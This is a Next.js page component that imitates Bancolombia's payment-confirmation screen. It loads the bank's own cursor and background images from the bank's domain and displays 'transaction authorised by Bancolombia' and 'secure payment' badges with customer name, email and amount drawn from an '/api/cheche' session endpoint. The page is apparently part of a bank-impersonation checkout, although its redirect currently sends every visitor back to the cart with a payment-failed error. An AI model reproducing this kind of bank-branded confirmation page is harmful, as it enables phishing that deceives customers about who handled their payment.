'use client';

import { useEffect, useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { useCart } from '@/hooks/useCart';

export default function BancolombiaExitoPage() {
  const [sessionId, setSessionId] = useState('');
  const [orderDetails, setOrderDetails] = useState<any>(null);
  const router = useRouter();
  const searchParams = useSearchParams();
  const { clearCart } = useCart();

  useEffect(() => {
    // ESTA PÁGINA NO DEBERÍA SER ACCESIBLE - REDIRIGIR AL CARRITO CON ERROR
    router.push('/carrito?error=pago_fallido');
  }, [router]);

  const fetchSessionDetails = async (id: string) => {
    try {
      const response = await fetch(`/api/cheche?action=get_session&sessionId=${id}`);
      const data = await response.json();
      if (data.success && data.session) {
        const customerData = JSON.parse(data.session.customerData);
        const orderData = JSON.parse(data.session.orderData);
        setOrderDetails({ customerData, orderData });
      }
    } catch (error) {
      console.error('Error fetching session details:', error);
    }
  };

  const markSessionCompleted = async (id: string) => {
    try {
      await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'complete',
          sessionId: id
        })
      });
    } catch (error) {
      console.error('Error marking session as completed:', error);
    }
  };

  const handleGoHome = () => {
    router.push('/');
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0
    }).format(amount);
  };

  return (
    <div 
      className="min-h-screen relative"
      style={{
        fontFamily: '"Open Sans", Arial, sans-serif',
        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
      }}
    >
      {/* Official Bancolombia background */}
      <div 
        className="min-h-screen bg-no-repeat bg-center bg-cover flex items-center justify-center"
        style={{
          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
        }}
      >
        
        {/* Top Header */}
        <div className="absolute top-0 left-0 right-0 bg-white border-b border-gray-200 py-3">
          <div className="max-w-7xl mx-auto px-4 flex justify-center items-center">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-6"
            />
          </div>
        </div>

        {/* Main Content */}
        <div className="w-full max-w-md mx-auto px-4">
          <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
            
            {/* Success Icon & Title */}
            <div className="text-center py-10 px-8 bg-gradient-to-b from-green-50 to-white">
              <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">¡Pago Exitoso!</h2>
              <p className="text-gray-600 text-base">
                Tu transacción ha sido procesada correctamente
              </p>
            </div>

            {/* Transaction Details */}
            {orderDetails && (
              <div className="px-8 py-6 space-y-4">
                <div className="bg-gray-50 rounded-xl p-5">
                  <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-200">
                    <span className="text-gray-600 font-medium">Monto pagado:</span>
                    <span className="font-bold text-2xl text-green-600">
                      {formatCurrency(orderDetails.orderData.totalAmount)}
                    </span>
                  </div>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-500">Cliente:</span>
                      <span className="font-medium text-gray-800 text-sm">
                        {orderDetails.customerData.fullName}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-500">Email:</span>
                      <span className="font-medium text-gray-800 text-sm uppercase">
                        {orderDetails.customerData.email}
                      </span>
                    </div>
                  </div>
                </div>

                <div className="bg-blue-50 rounded-xl p-4 border border-blue-100">
                  <div className="flex items-center justify-center space-x-2 text-blue-700">
                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                    </svg>
                    <span className="text-sm font-semibold">
                      Transacción autorizada por Bancolombia
                    </span>
                  </div>
                </div>
              </div>
            )}

            {/* Action Button */}
            <div className="px-8 pb-8">
              <button
                onClick={handleGoHome}
                className="w-full py-4 bg-[#004B87] text-white rounded-xl hover:bg-[#003666] transition font-semibold text-lg shadow-lg"
              >
                Volver al inicio
              </button>
            </div>

            {/* Security Badge */}
            <div className="px-8 pb-6 text-center">
              <div className="flex items-center justify-center space-x-2 text-green-600">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span className="text-sm font-medium">Pago procesado de forma segura</span>
              </div>
            </div>
          </div>

          {/* Footer Info */}
          <div className="text-center mt-6 space-y-2">
            <p className="text-gray-700 text-sm font-medium">
              Recibirás un email de confirmación en los próximos minutos
            </p>
            <p className="text-gray-500 text-xs">
              Referencia: {sessionId.slice(-8).toUpperCase()}
            </p>
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-5 mx-auto opacity-60 mt-4"
            />
          </div>
        </div>
      </div>
    </div>
  );
}